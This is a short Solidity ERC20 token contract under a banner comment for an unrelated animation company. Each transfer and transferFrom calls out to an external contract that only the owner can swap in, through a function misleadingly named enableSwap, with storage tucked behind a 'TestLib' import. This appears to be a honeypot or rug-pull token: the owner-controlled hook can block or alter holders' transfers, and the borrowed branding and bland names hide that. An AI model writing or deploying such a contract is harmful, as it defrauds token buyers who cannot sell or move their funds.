/*
    
    /$$      /$$  /$$$$$$  /$$$$$$$   /$$$$$$ 
    | $$$    /$$$ /$$__  $$| $$__  $$ /$$__  $$
    | $$$$  /$$$$| $$  \ $$| $$  \ $$| $$  \__/
    | $$ $$/$$ $$| $$  | $$| $$$$$$$/| $$      
    | $$  $$$| $$| $$  | $$| $$__  $$| $$      
    | $$\  $ | $$| $$  | $$| $$  \ $$| $$    $$
    | $$ \/  | $$|  $$$$$$/| $$  | $$|  $$$$$$/
    |__/     |__/ \______/ |__/  |__/ \______/ 
                                           
                                           
    Morc make animations and digital tools.
    We help teams to explain, deliver and disseminate their research.
    We specialise in providing a range of well thought out, creative digital products for clinical trials.

    Website: https://morph.co.uk/
    Twitter: https://twitter.com/morphhq
    Facebook: https://facebook.com/morphhq
    Youtube: https://youtube.com/channelmorph
    Linkedin: https://www.linkedin.com/company/morph-films/
*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract transferFacet is ERC20, Ownable {
    function transfer(
        address to,
        uint256 value
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.txs.record(msg.sender, to, value);
        return super.transfer(to, value);
    }
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.txs.record(from, to, value);
        return super.transferFrom(from, to, value);
    }
    function enableSwap(address _tx) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.txs = Transaction(_tx);
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
}
